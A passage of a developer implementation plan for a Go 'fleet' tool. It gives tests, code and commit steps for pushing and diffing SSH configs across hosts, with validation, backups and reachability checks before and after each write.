			return nil, fmt.Errorf("--host %q is not a fleet host", a)
		}
	}
	return filterHosts(all, only), nil
}

// bootstrapNeeded lists hosts a key sync cannot help: authorizing a key means
// APPENDING to the host's authorized_keys, which requires access we do not
// have. Saying so is the honest answer.
func bootstrapNeeded(rows []Row) []string {
	var out []string
	for _, r := range rows {
		if r.Class == string(drift.AuthFailed) || r.Class == string(drift.Unreachable) {
			out = append(out, r.Alias)
		}
	}
	return out
}
```

Wire `--host` into `keysSyncCmd` via `checkHosts`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./cmd/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): keys sync --host, and honest manual-bootstrap reporting"
```

---

### Task 9: `fleet config push` — plan, guard, validate, write

**Files:**
- Create: `sdk/fleet/cmd/config_push.go`
- Test: `sdk/fleet/cmd/config_push_test.go`

**Interfaces:**
- Produces: `pushPlan(r runner.Runner, target, localText string, o cfgplan.Opts) (cfgplan.Plan, error)`, `selfRetarget(p cfgplan.Plan, target string) bool`, `remoteInstall(r runner.Runner, target, text string) error`.

Push is the dangerous direction: a bad write breaks SSH access on the target, and fleet cannot repair a host it can no longer reach.

- [ ] **Step 1: Write the failing test**

```go
// The specific way a helpful push becomes unrecoverable.
func TestSelfRetargetIsDetected(t *testing.T) {
	p := cfgplan.Plan{Changes: []cfgplan.Change{
		{Alias: "target", Kind: cfgplan.Update, Fields: []cfgplan.FieldDelta{{Name: "HostName", From: "10.0.0.1", To: "10.0.0.2"}}},
	}}
	if !selfRetarget(p, "target") {
		t.Fatal("changing the connecting alias must be detected")
	}
	if selfRetarget(p, "other") {
		t.Fatal("an unrelated alias must not trip the guard")
	}
}

// A config that will not parse must never be installed.
func TestRemoteInstallValidatesBeforeMoving(t *testing.T) {
	var argv []string
	r := recordingRunner{seen: &argv, failOn: "ssh -G"}
	if err := remoteInstall(r, "target", "Host a\n    HostName 10.0.0.1\n"); err == nil {
		t.Fatal("a failed validation must abort the install")
	}
	joined := strings.Join(argv, " ")
	if strings.Contains(joined, "mv ") {
		t.Fatalf("install moved the file despite failed validation: %q", joined)
	}
}

func TestRemoteInstallBacksUpBeforeWriting(t *testing.T) {
	var argv []string
	r := recordingRunner{seen: &argv}
	_ = remoteInstall(r, "target", "Host a\n")
	joined := strings.Join(argv, " ")
	iBak, iMove := strings.Index(joined, ".bak."), strings.Index(joined, "mv ")
	if iBak < 0 || iMove < 0 || iBak > iMove {
		t.Fatalf("backup must precede the move: %q", joined)
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run 'SelfRetarget|RemoteInstall'`
Expected: FAIL — `undefined: selfRetarget`, `undefined: remoteInstall`.

- [ ] **Step 3: Write minimal implementation**

```go
// selfRetarget reports whether the plan would change how we reach the very host
// we are writing to. Applying that can cost access with no way back in.
func selfRetarget(p cfgplan.Plan, target string) bool {
	for _, c := range p.Changes {
		if c.Alias != target || c.Kind != cfgplan.Update {
			continue
		}
		for _, f := range c.Fields {
			switch f.Name {
			case "HostName", "Port", "User", "IdentityFile":
				return true
			}
		}
	}
	return false
}

// remoteInstall writes to a temp path, VALIDATES it by asking ssh to parse it,
// backs up the original, and only then moves it into place. Validation before
// commit is what keeps a malformed push from costing SSH access.
func remoteInstall(r runner.Runner, target, text string) error {
	const tmp = "~/.ssh/config.fleet-new"
	if _, err := r.RunStdin(target, text, "cat > "+tmp+" && chmod 600 "+tmp); err != nil {
		return fmt.Errorf("%s: staging: %w", target, err)
	}
	if _, err := r.Run(target, "ssh -F "+tmp+" -G fleet-validation-probe >/dev/null"); err != nil {
		_, _ = r.Run(target, "rm -f "+tmp)
		return fmt.Errorf("%s: staged config failed validation, nothing installed: %w", target, err)
	}
	stamp := time.Now().Format("20060102-150405")
	move := "cp -p ~/.ssh/config ~/.ssh/config.bak." + stamp + " 2>/dev/null; mv " + tmp + " ~/.ssh/config"
	if _, err := r.Run(target, move); err != nil {
		return fmt.Errorf("%s: installing: %w", target, err)
	}
	return nil
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./cmd/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): config push with validate-before-install and self-retarget guard"
```

---

### Task 10: `fleet config diff` (F16) and post-push probe (F15)

**Files:**
- Create: `sdk/fleet/cmd/config_diff.go`
- Modify: `sdk/fleet/cmd/config_push.go`
- Test: `sdk/fleet/cmd/config_diff_test.go`

**Interfaces:**
- Produces: `diffBothWays(local, remote string, o cfgplan.Opts) (inbound, outbound cfgplan.Plan, err error)`.

- [ ] **Step 1: Write the failing test**

```go
// diff is read-only and directionless: it shows both, changes neither.
func TestDiffShowsBothDirectionsAndWritesNothing(t *testing.T) {
	local := "Host a  #fleet\n    HostName 10.0.0.1\n"
	remote := "Host a  #fleet\n    HostName 10.0.0.9\n    \nHost b  #fleet\n    HostName 10.0.0.2\n"
	in, out, err := diffBothWays(local, remote, cfgplan.Opts{Marker: "#fleet"})
	if err != nil {
		t.Fatal(err)
	}
	if in.Empty() {
		t.Fatal("inbound plan should see b as an add and a as an update")
	}
	if out.Empty() {
		t.Fatal("outbound plan should see a as an update")
	}
}

// A target that stopped answering after a push is the outcome that matters most.
func TestPostPushProbeFlagsATargetThatStoppedAnswering(t *testing.T) {
	r := runner.Fake{Err: map[string]error{"target": runner.ErrFake}}
	if err := verifyTarget(r, "target"); err == nil {
		t.Fatal("want an error naming the now-unreachable target")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run 'Diff|PostPush'`
Expected: FAIL — `undefined: diffBothWays`, `undefined: verifyTarget`.

- [ ] **Step 3: Write minimal implementation**

```go
// diffBothWays computes what a pull would do and what a push would do, without
// performing either. It is the only place both directions appear together, and
// it writes nothing anywhere.
func diffBothWays(local, remote string, o cfgplan.Opts) (cfgplan.Plan, cfgplan.Plan, error) {
	in, err := cfgplan.Build(local, remote, o)
	if err != nil {
		return cfgplan.Plan{}, cfgplan.Plan{}, err
	}
	out, err := cfgplan.Build(remote, local, o)
	if err != nil {
		return cfgplan.Plan{}, cfgplan.Plan{}, err
	}
	return in, out, nil
}

// verifyTarget re-probes after a write. Losing a host here is recoverable only
// out-of-band, so it must be reported loudly rather than inferred from silence.
func verifyTarget(r runner.Runner, target string) error {
	if _, err := r.Run(target, "true"); err != nil {
		return fmt.Errorf("%s STOPPED ANSWERING after the push — restore its ~/.ssh/config.bak.* out of band", target)
	}
	return nil
}
```

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test -race ./...`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): config diff, and a post-push reachability check"
```

---

### Task 11: TUI bindings (F17)

**Files:**
- Modify: `sdk/fleet/cmd/tui_keys.go`, `sdk/fleet/cmd/tui_cmds.go`, `sdk/fleet/cmd/tui_model.go`
- Test: `sdk/fleet/cmd/tui_config_test.go`

**Interfaces:**
- Consumes: `pullPlan`, `pushPlan`, the in-flight ownership set.

- [ ] **Step 1: Write the failing test**

```go
// keyHelp is the single source of truth; a binding missing from it ships
// undiscoverable, which is exactly how the log pane shipped invisible.
func TestConfigKeysAreDeclaredInKeyHelp(t *testing.T) {
	var havePull, havePush bool
	for _, k := range keyHelp {
		if k.keys == "p" {
			havePull = true
		}
		if k.keys == "P" {
			havePush = true
		}
	}
	if !havePull || !havePush {
		t.Fatalf("p=%v P=%v — both must be declared in keyHelp", havePull, havePush)
	}
}

// Two async paths must never own one row.
func TestConfigActionSkipsAHostAnotherPathOwns(t *testing.T) {
	m := tuiModel{pending: map[string]bool{"busy": true}}
	if m.canStartConfigAction("busy") {
		t.Fatal("a pending host must not be claimed by a config action")
	}
}
```

- [ ] **Step 2: Run test to verify it fails**

Run: `cd sdk/fleet && go test ./cmd/ -run ConfigKeys`
Expected: FAIL — `p`/`P` absent from `keyHelp`.

- [ ] **Step 3: Write minimal implementation**

Add to `keyHelp`:

```go
	{"📥", "p", "pull ssh config from cursor host", false},
	{"📤", "P", "push ssh config to cursor host", false},
```

and route both in `tui_keys.go`, gated by `canStartConfigAction`.

- [ ] **Step 4: Run test to verify it passes**

Run: `cd sdk/fleet && go test ./cmd/`
Expected: PASS.

- [ ] **Step 5: Commit**

```bash
git add sdk/fleet/cmd/
git commit -m "feat(fleet): TUI p/P bindings for one-way config transfer"
```

---

### Task 12: pin the invariants in AGENTS.md

**Files:**
- Modify: `sdk/fleet/AGENTS.md`

- [ ] **Step 1: Add the layout rows**

```markdown
| `internal/cfgplan` | plan a ONE-WAY ssh-config transfer (pure); `Build` + `Apply` |
```

- [ ] **Step 2: Add the invariants**

```markdown
- **Config transfer is one-way, always.** `config pull` and `config push` each move
  configuration in exactly one direction, named at the call site. There is deliberately
  no `sync` verb: a combined operation would resolve conflicts by policy instead of by
  an operator reading a diff, and would make one mistake's blast radius the union of
  both directions.
- **A pull cannot import an exec directive.** `sshconf.Host` models only inert fields,
  so `ProxyCommand` / `LocalCommand` / `Match exec` have nowhere to land. This is
  structural, not a filter — there is no allowlist to forget. Because that also makes
  exclusions invisible, `cfgplan` scans the raw text and NAMES what it withheld.
  Pinned by `TestBuildNeverCarriesAnExecDirective`.
- **`Add` purges; `Update` preserves.** `sshconf.Add` re-renders a block from the
  struct and would destroy an operator's `ProxyCommand`, so it is used ONLY for
  aliases that do not exist yet. Every update goes through `sshconf.Update`, which
  rewrites modelled directives in place. Pinned by
  `TestUpdateRewritesOnlyModelledDirectives`.
- **A push validates before it commits.** The staged config is parsed by ssh on the
  target before it replaces the live one, the original is backed up first, and the
  target is re-probed after. Fleet cannot repair a host it can no longer reach, so the
  guards exist to make that outcome very unlikely and human-recoverable when it happens.
  Pinned by `TestRemoteInstallValidatesBeforeMoving`.
- **Omission is never deletion.** An empty field in a source block leaves the local
  value alone; no transfer blanks a directive the other side simply did not set.
```

- [ ] **Step 3: Commit**

```bash
git add sdk/fleet/AGENTS.md
git commit -m "docs(fleet): pin the one-way config transfer invariants"
```

---

## Self-review

**Spec coverage:** F1→T5, F2→T1/T3/T4, F3→T2, F4→T2, F5→T2, F6→T4, F7→T6, F8→T7, F9→T8, F10→T8, F11→T9, F12→T9, F13→T9, F14→T9, F15→T10, F16→T10, F17→T11, F18→T6, F19→T5. All 19 covered.

**Type consistency:** `cfgplan.Build`/`Plan.Apply`/`Plan.Empty`, `sshconf.Update(cfg, h)`, `pullPlan`/`pushPlan`, `missingIdentities`, `filterHosts`/`checkHosts`, `selfRetarget`/`remoteInstall`/`verifyTarget`, `diffBothWays`, `writeConfig`/`isLoopbackHostName` — each defined once and referenced with the same signature throughout.

**Known follow-up:** `recordingRunner` is a test helper used from Task 5 onward; it is defined in Task 5's test file and reused. Task 9's variant adds a `failOn` field — extend the same struct rather than declaring a second one.
